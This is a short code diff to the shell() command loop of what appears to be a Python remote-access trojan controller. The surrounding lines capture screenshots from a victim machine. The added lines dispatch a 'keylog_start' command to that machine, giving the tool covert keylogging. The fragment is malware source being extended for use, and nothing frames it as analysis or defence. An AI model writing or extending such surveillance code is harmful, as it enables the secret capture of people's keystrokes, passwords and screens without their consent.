@@ -79,6 +79,8 @@ def shell():
                     print(image)
                     screen.write(image)
                     count_screen += 1
+        elif len(command) > 1 and command[:12] == "keylog_start":
+            reliable_send(command)
         else:
             reliable_send(command)
             message = reliable_recv()
